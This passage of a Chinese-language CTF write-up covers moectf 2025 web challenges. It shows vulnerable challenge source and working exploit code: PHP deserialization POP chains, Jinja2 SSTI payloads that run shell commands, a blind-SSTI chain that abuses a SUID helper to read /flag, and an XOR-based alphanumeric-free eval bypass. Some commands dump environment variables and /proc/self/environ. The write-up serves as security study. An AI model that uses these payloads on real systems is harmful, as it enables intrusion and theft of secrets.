plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=new A();</span><br><span class="line">$c-&gt;a=&quot;system(&#x27;env&#x27;);&quot;;</span><br><span class="line">echo serialize($c);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>简单的反序列化 给a复制相应的命令就好了</p><p><img src="/../images/image-20251014164009204-1760512687700-72.png" alt="image-20251014164009204"></p><h3 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a><strong>18 第十八章 万卷诡阁·功法连环</strong></h3><h4 id="考点：php反序列化-1"><a href="#考点：php反序列化-1" class="headerlink" title="考点：php反序列化"></a>考点：php反序列化</h4><p><img src="/../images/image-20251014164636541-1760512687700-73.png" alt="image-20251014164636541"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA &#123;</span><br><span class="line">    private $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PersonB &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$code=&quot;phpinfo();&quot;;</span><br><span class="line">$personB=new PersonB($code);</span><br><span class="line">$personA=new PersonA($personB);</span><br><span class="line">$serialized=serialize($personA);</span><br><span class="line">print(urlencode($serialized));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意private以及函数构造</p><p><img src="/../images/image-20251014165356363-1760512687700-74.png" alt="image-20251014165356363"></p><h3 id="19-第十九章-星穹真相·补天归源"><a href="#19-第十九章-星穹真相·补天归源" class="headerlink" title="19 第十九章 星穹真相·补天归源"></a><strong>19 第十九章 星穹真相·补天归源</strong></h3><h4 id="考点php反序列化"><a href="#考点php反序列化" class="headerlink" title="考点php反序列化"></a>考点php反序列化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name-&gt;$id($age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __Check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $name($age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题多解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class PersonB</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class PersonC</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$cmd = &quot;cat /????&quot;;</span><br><span class="line"> </span><br><span class="line">$c = new PersonC();</span><br><span class="line">$c-&gt;name = &quot;system&quot;;</span><br><span class="line">$c-&gt;id = null;</span><br><span class="line"> </span><br><span class="line">$a = new PersonA();</span><br><span class="line"> </span><br><span class="line">$a-&gt;name = $c;</span><br><span class="line">$a-&gt;id = &quot;__Check&quot;;</span><br><span class="line"> </span><br><span class="line">$b = new PersonB();</span><br><span class="line">$b-&gt;id = $a;</span><br><span class="line">$b-&gt;name = $cmd;</span><br><span class="line"> </span><br><span class="line">$c-&gt;id = $b;</span><br><span class="line"> </span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">$c=new PersonC();</span><br><span class="line">$c-&gt;name=&quot;system&quot;;</span><br><span class="line">$c-&gt;age=&quot;love&quot;;</span><br><span class="line">$a=new PersonA();</span><br><span class="line">$a-&gt;name=$c; </span><br><span class="line">$a-&gt;id=&quot;__Check&quot;;</span><br><span class="line">$a-&gt;age=&quot;cat /f*&quot;;</span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo urlencode($payload);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a><strong>19 第十九章_revenge</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $name-&gt;$id($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        if($age == null)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Age can&#x27;t be empty.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if($name === &quot;system&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var_dump($name($age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $this-&gt;age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用了system</p><p><img src="/../images/image-20251015142726469-1760512687700-75.png" alt="image-20251015142726469"></p><p><a href="https://blog.csdn.net/2303_76585504/article/details/152668659">moectf 2025 writeup-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  class Person&#123;public $name,$id,$age;&#125;</span><br><span class="line">class PersonA extends Person&#123;&#125;</span><br><span class="line">class PersonB extends Person&#123;&#125;</span><br><span class="line">class PersonC extends Person&#123;&#125;</span><br><span class="line">$c=new PersonC;$b=new PersonB;$a=new PersonA;</span><br><span class="line">$c-&gt;name=&#x27;passthru&#x27;;$c-&gt;id=$b;$c-&gt;age=&#x27;phantom&#x27;;</span><br><span class="line">$b-&gt;id=$a;$b-&gt;name=&#x27;env&gt;flag.txt&#x27;;</span><br><span class="line">$a-&gt;id=&#x27;check&#x27;;</span><br><span class="line">echo urlencode(serialize($c));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;/proc/self/environ&quot;;</span><br><span class="line">$function = &quot;file_get_contents&quot;;</span><br><span class="line"></span><br><span class="line">$c = new PersonC();</span><br><span class="line">$c-&gt;name = $function;</span><br><span class="line"></span><br><span class="line">$a = new PersonA();</span><br><span class="line"></span><br><span class="line">$a-&gt;name = $c;</span><br><span class="line">$a-&gt;id = &quot;check&quot;;</span><br><span class="line"></span><br><span class="line">$b = new PersonB();</span><br><span class="line">$b-&gt;id = $a;</span><br><span class="line">$b-&gt;name = $cmd;</span><br><span class="line"></span><br><span class="line">$c-&gt;id = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="20-第二十章-幽冥血海·幻语心魔"><a href="#20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="20 第二十章 幽冥血海·幻语心魔"></a><strong>20 第二十章 幽冥血海·幻语心魔</strong></h3><h4 id="考点：无限制SSTI"><a href="#考点：无限制SSTI" class="headerlink" title="考点：无限制SSTI"></a>考点：无限制<code>SSTI</code></h4><p><img src="/../images/image-20251014195214923-1760512687700-76.png" alt="image-20251014195214923"></p><p>使用的是<code>render_template_string()</code>函数动态渲染，用户可控的 <code>username</code>参数<strong>直接拼接</strong>到模板字符串中</p><p><img src="/../images/image-20251014195338347-1760512687700-77.png" alt="image-20251014195338347"></p><p>直接获得shell，查看环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;env&#x27;).read()&#125;&#125;&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014195629362-1760512687700-78.png" alt="image-20251014195629362"></p><h3 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a><strong>21 第二十一章 往生漩涡·言灵死局</strong></h3><h4 id="考点：简单限制SSTI"><a href="#考点：简单限制SSTI" class="headerlink" title="考点：简单限制SSTI"></a>考点：简单限制<code>SSTI</code></h4><p>源码还是和之前的一样但是加了一个黑名单</p><p><img src="/../images/image-20251014195837206-1760455318317-4-1760512687700-79.png" alt="image-20251014195837206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; 代替 &#123;&#123; ... &#125;&#125;</span><br><span class="line">拼接关键字[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014232940628-1760512687700-81.png" alt="image-20251014232940628"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;%print(lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;env&#x27;).read())%&#125;&amp;password=1</span><br></pre></td></tr></table></figure><h3 id="22-第二十二章-血海核心·千年手段"><a href="#22-第二十二章-血海核心·千年手段" class="headerlink" title="22 第二十二章 血海核心·千年手段"></a><strong>22 第二十二章 血海核心·千年手段</strong></h3><h4 id="考点：无回显SSTI"><a href="#考点：无回显SSTI" class="headerlink" title="考点：无回显SSTI"></a>考点：无回显<code>SSTI</code></h4><p><img src="/../images/image-20251014233417847-1760512687700-80.png" alt="image-20251014233417847"></p><p>没有将 <code>render_template_string</code> 函数的返回值赋给任何变量,即是无回显，常规的写文件到static【这里有多种解】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;env &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现flag不在环境变量里面，ls &#x2F; 发现flag但是没有权限读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;find / -perm -4000&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br><span class="line">【查找具有sudi权限文件】</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014234711691-1760512687700-84.png" alt="image-20251014234711691"></p><p>&#x2F;usr&#x2F;bin&#x2F;rev用于翻转字符串 但是发现无回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;/usr/bin/rev /flag&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>查看能够使用的命令,发现有个rev.c文件【实则看了官wp才知道】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static; cat /usr/bin&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014235714305-1760512687700-85.png" alt="image-20251014235714305"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;cat /usr/bin/rev.c &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line"></span><br><span class="line">    for(int i = 1; i + 1 &lt; argc; i++) &#123;</span><br><span class="line">        if (strcmp(&quot;--HDdss&quot;, argv[i]) == 0) &#123;</span><br><span class="line">            execvp(argv[i + 1], &amp;argv[i + 1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要使用--HDdss参数执行命令,就能获得flag</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static; /usr/bin/rev --HDdss cat /flag &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>官wp也说了，可以内存马打无回显,后面在ssti专题再去总结吧，已老实求放过</p><h3 id="【未完成】23-第二十三章-幻境迷心·皇陨星沉-大结局"><a href="#【未完成】23-第二十三章-幻境迷心·皇陨星沉-大结局" class="headerlink" title="【未完成】23 第二十三章 幻境迷心·皇陨星沉(大结局)"></a>【未完成】<strong>23 第二十三章 幻境迷心·皇陨星沉(大结局)</strong></h3><h4 id="考点：java反序列化"><a href="#考点：java反序列化" class="headerlink" title="考点：java反序列化"></a>考点：java反序列化</h4><h3 id="24-番外篇（1）摸金偶遇FLAG，拼尽全力难战胜"><a href="#24-番外篇（1）摸金偶遇FLAG，拼尽全力难战胜" class="headerlink" title="24 番外篇（1）摸金偶遇FLAG，拼尽全力难战胜"></a>24 番外篇（1）<strong>摸金偶遇FLAG，拼尽全力难战胜</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">玩家需要在限定时间内破译9位摩斯密码数字序列</span><br><span class="line">左侧显示需要破译的摩斯密码序列</span><br><span class="line">右侧提供数字键盘输入答案</span><br><span class="line">每个数字对应特定的摩斯密码图案（点·和线━）</span><br></pre></td></tr></table></figure><p>接受传递的数据，再post请求回去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/get_challenge?count=9&#x27;)</span><br><span class="line">.then(r =&gt; r.json())</span><br><span class="line">.then(d =&gt; &#123;</span><br><span class="line">    console.log(&#x27;answers:&#x27;, d.numbers, &#x27;token:&#x27;, d.token);</span><br><span class="line">return fetch(&#x27;/verify&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;answers: d.numbers, token: d.token&#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">.then(r =&gt; r.json())</span><br><span class="line">.then(data =&gt; console.log(&#x27;verify result:&#x27;, data));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251015105326728-1760512687700-83.png" alt="image-20251015105326728"></p><h3 id="25-番外篇（2）这是…Webshell？"><a href="#25-番外篇（2）这是…Webshell？" class="headerlink" title="25 番外篇（2）这是…Webshell？"></a>25 番外篇（2）<strong>这是…Webshell？</strong></h3><h4 id="考点：无字母数字rce绕过"><a href="#考点：无字母数字rce绕过" class="headerlink" title="考点：无字母数字rce绕过"></a>考点：无字母数字rce绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">    $shell = $_GET[&#x27;shell&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;, $_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">        eval($shell);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>无字母无数字的rce绕过,异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;($&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%aa&#125;);&amp;%ff=system&amp;%aa=env</span><br></pre></td></tr></table></figure><h3 id="26-番外篇（3）这是…Webshell-revenge"><a href="#26-番外篇（3）这是…Webshell-revenge" class="headerlink" title="26 番外篇（3）这是…Webshell?_revenge"></a><strong>26 番外篇（3）这是…Webshell?_revenge</strong></h3><h4 id="考点：rce绕过"><a href="#考点：rce绕过" class="headerlink" title="考点：rce绕过"></a>考点：rce绕过</h4><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p><p><a href="https://forum.butian.net/share/1048">奇安信攻防社区-RCE全覆盖总结</a></p><p><img 